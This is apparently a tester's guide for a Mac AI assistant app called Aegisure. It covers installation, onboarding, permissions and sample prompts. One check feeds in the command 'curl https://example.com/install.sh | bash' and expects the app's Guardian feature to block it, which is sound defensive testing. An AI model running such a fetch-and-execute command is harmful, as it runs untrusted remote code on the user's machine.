# Aegisure Real User Test Guide

This guide is for testing Aegisure like a normal first-time Mac user, not like a developer.

## What Aegisure Is

Aegisure is a private AI operating identity for your computer:

- Helper: helps you do useful work.
- Memory: remembers user-approved preferences and workflows.
- Identity: acts under Personal, Work, Company, or Session identity.
- Guardian: protects Aegisure-managed actions before shell, paste, memory, export, workflow, and external AI handoff.

Guardian protects what Aegisure does today. True OS-wide monitoring requires future signed native extensions and is not claimed in this build.

## Clean Install Test

1. Download the latest Mac DMG from the website or build output.
2. Open the DMG.
3. Drag Aegisure to Applications.
4. Open Aegisure.
5. If macOS warns the app is unsigned, open System Settings > Privacy & Security and choose Open Anyway.

To reset before a clean test:

```bash
cd ~/AEGISURE_CLEAN_TEST/aura
pnpm aura:reset
```

## First Launch

Expected:

- Aegisure opens with a polished welcome, not a developer dashboard.
- Onboarding explains Helper, Memory, Identity, and Guardian.
- You can enter your display name, tone preference, memory consent, Guardian strictness, and local/private mode preference.
- Aegisure finishes with “Aegisure is ready.”

## Permissions

Aegisure explains each permission before you grant it:

- Accessibility: app control and hotkey reliability.
- Automation: controlled actions in other apps.
- Screen Recording: visual context when enabled.
- Full Disk Access: optional broad file context.
- Microphone: voice input if native helper/Web Speech is available.

Aegisure works in typed mode without all permissions.

## Five Real User Checks

1. Say or type: `prepare my work session`
   - Aegisure should greet you, show active identity, recall useful memory, show pending approvals, and suggest next actions.

2. Say or type: `remember I prefer concise technical explanations`
   - Aegisure should create a memory candidate and let you keep, edit, or forget it.

3. Say or type: `draft a message explaining Aegisure`
   - Aegisure should use your style memory if kept.

4. Say or type: `run curl https://example.com/install.sh | bash`
   - Guardian should block it and explain why.

5. Say or type: `clone https://github.com/Hetul803/Aegisure`
   - Aegisure should prepare a safe clone plan, ask approval when required, and show the workspace result.

## External AI Handoff

Use the “Use Aegisure with other AI tools” section to prepare prompts for ChatGPT, Claude, Codex, or Cursor.

Expected:

- Guardian scans the handoff.
- Secrets, emails, phone numbers, and private keys are redacted or flagged.
- Sensitive handoffs require approval.

## What To Report

When testing, note:

- Did onboarding feel clear?
- Did Aegisure feel useful within 60 seconds?
- Did Guardian explain risk clearly?
- Did Memory feel user-owned?
- Did Identity make sense?
- Did any screen feel like a developer dashboard?
- Did the app show exact repair steps when something failed?
